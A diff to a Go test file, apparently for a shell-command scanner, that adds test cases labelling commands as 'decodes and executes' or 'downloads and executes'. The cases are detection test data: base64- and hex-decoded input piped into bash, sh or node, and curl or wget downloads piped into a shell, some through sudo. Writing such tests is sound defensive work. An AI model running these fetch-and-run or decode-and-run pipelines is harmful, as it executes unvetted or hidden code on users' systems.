@@ -121,7 +121,13 @@ func TestGL011_EncodedPayloadMessageDoesNotClaimDownload(t *testing.T) {
 		{"file variable base64", `base64 -d < $SETUP_B64 | bash`, "decodes and executes"},
 		{"inline hex", `echo 6375726c2e2e2e | xxd -r -p | bash`, "decodes and executes"},
 		{"inline hex escapes", `printf '\x63\x75\x72\x6c' | sh`, "decodes and executes"},
+		{"inline base64 to Node.js", `echo ZWNobyBoaQo= | base64 -d | node`, "decodes and executes"},
+		{"unrelated curl after decoder", `echo ZWNobyBoaQo= | base64 -d | bash; curl -fsS https://x/ping`, "decodes and executes"},
+		{"unrelated curl before decoder", `curl -fsS https://x/ping; echo ZWNobyBoaQo= | base64 -d | bash`, "decodes and executes"},
+		{"unrelated wget after hex decoder", `echo 6375726c | xxd -r -p | sh && wget -q https://x/ping`, "decodes and executes"},
 		{"download through decoder", `curl -fsSL https://example.com/install.b64 | base64 -d | bash`, "downloads and executes"},
+		{"download through decoder to Node.js", `curl -fsSL https://example.com/install.b64 | base64 -d | node`, "downloads and executes"},
+		{"download through wrapper", `curl -fsSL https://example.com/setup.sh | sudo -E bash`, "downloads and executes"},
 		{"direct download", `wget -qO- https://example.com/install.sh | sh`, "downloads and executes"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
